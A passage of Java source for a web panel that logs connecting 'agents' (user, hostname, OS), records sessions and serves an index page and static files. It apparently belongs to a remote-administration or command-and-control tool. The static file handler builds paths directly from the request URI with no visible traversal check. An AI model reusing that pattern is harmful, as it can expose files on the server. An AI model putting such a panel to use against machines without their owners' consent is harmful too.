    private void OnEvent(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case AgentConnected -> {
                AddLog("SESSIONS-" + Data.get("ID") + " [" + Data.get("Type") + "] " + Data.get("User") + "@" + Data.get("Hostname") + " " + Data.get("OS"));
                Db.SaveSessionEvent(Data, "connected");
            }
            case AgentDisconnected -> {
                AddLog("SESSIONS-" + Data.get("ID") + " disconnected: " + Data.get("Reason"));
                Db.SaveSessionEvent(Data, "disconnected");
            }
            case Error -> AddLog("" + Data.get("Message"));
        }
    }

    private void AddLog(String Msg) {
        String Entry = "  [" + LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")) + "] " + Msg;
        Logs.add(Entry);
        if (Logs.size() > MaxLogs) Logs.remove(0);
        Db.SaveLog(Entry);
    }

    public void Stop() {
        try {
            if (ServerOwned && Server != null && Server.IsRunning()) {
                Server.StopServer();
            }
        } catch (Exception Ignored) {}
        try {
            if (HttpSrv != null) HttpSrv.stop(1);
        } catch (Exception Ignored) {}
        HttpSrv = null;
        Server = null;
        ServerOwned = false;
        ServerStartTime = null;
        Logger.Info("Web panel stopped");
    }

    public boolean IsRunning() {
        return HttpSrv != null;
    }

    private String Uptime() {
        if (ServerStartTime == null) return "00:00:00";
        long S = Duration.between(ServerStartTime, Instant.now()).getSeconds();
        return String.format("%02d:%02d:%02d", S / 3600, (S % 3600) / 60, S % 60);
    }

    @SuppressWarnings("unchecked")
    private Map<String, Object> Body(HttpExchange E) throws Exception {
        try (InputStream Is = E.getRequestBody()) {
            String S = new String(Is.readAllBytes(), "UTF-8");
            if (S.isEmpty()) return new HashMap<>();
            return GsonInst.fromJson(S, Map.class);
        }
    }

    private static String Str(Map<String, Object> M, String K, String Def) {
        Object V = M.get(K);
        return V != null ? V.toString() : Def;
    }

    private static int Num(Map<String, Object> M, String K, int Def) {
        try {
            return (int) Double.parseDouble(M.getOrDefault(K, Def).toString());
        } catch (Exception E) {
            return Def;
        }
    }

    class IndexHandler implements HttpHandler {

        @Override
        public void handle(HttpExchange E) throws IOException {
            Path Tpl = ResolvePath(Config.GetTemplateDir() + "/index.html");
            if (!Files.exists(Tpl)) {
                byte[] B = "404 index.html not found".getBytes();
                E.sendResponseHeaders(404, B.length);
                try (OutputStream O = E.getResponseBody()) {
                    O.write(B);
                }
                return;
            }
            E.getResponseHeaders().add("Content-Type", "text/html; charset=UTF-8");
            byte[] Data = Files.readAllBytes(Tpl);
            E.sendResponseHeaders(200, Data.length);
            try (OutputStream O = E.getResponseBody()) {
                O.write(Data);
            }
        }
    }

    class StaticHandler implements HttpHandler {

        @Override
        public void handle(HttpExchange E) throws IOException {
            String ReqPath = E.getRequestURI().getPath();
            String Rel = ReqPath.startsWith("/static/") ? ReqPath.substring(7) : ReqPath;
            Path Target = ResolvePath(Config.GetStaticDir() + Rel);
            if (!Files.exists(Target) || Files.isDirectory(Target)) {
                byte[] B = ("404 Not Found: " + ReqPath).getBytes();
                E.sendResponseHeaders(404, B.length);
                try (OutputStream O = E.getResponseBody()) {
                    O.write(B);
                }
                return;
            }
            E.getResponseHeaders().add("Content-Type", ContentType(Target.toString()));
            byte[] Data = Files.readAllBytes(Target);
            E.sendResponseHeaders(200, Data.length);
            try (OutputStream O = E.getResponseBody()) {
                O.write(Data);
            }
        }

        private String ContentType(String P) {
            if (P.endsWith(".html")) return "text/html; charset=UTF-8";
            if (P.endsWith(".css")) return "text/css";
            if (P.endsWith(".js")) return "application/javascript";
            if (P.endsWith(".json")) return "application/json";
            if (P.endsWith(".png")) return "image/png";
            if (P.endsWith(".svg")) return "image/svg+xml";
            if (P.endsWith(".ico")) return "image/x-icon";
            return "application/octet-stream";
        }
    }
}
